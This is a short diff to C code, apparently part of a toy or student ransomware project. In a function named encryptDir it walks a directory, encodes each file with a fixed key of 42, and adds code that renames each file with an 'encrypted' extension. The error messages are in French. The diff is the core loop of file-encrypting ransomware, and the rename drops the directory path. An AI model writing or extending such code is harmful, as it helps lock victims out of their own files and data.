@@ -86,9 +86,26 @@ void encryptDir(char *pathDir)
         }
 
         encodeFile(file, 42);
+        int len = strlen(entry->d_name);
+        if (len + EXT_LENGHT < sizeof(filePath))
+        {
+            char newFileName[10000];
+            snprintf(newFileName, sizeof(newFileName), "%s%s", entry->d_name, EXT_ENCRYPTED);
+            
+            if (rename(filePath, newFileName) != 0)
+            {
+                perror("Erreur lors du changement de nom du fichier");
+            }
+        }
+        else
+        {
+            perror("Nom de fichier trop long");
+        }
 
         fclose(file);
     }
+
+        
 
     closedir(dir);
 }
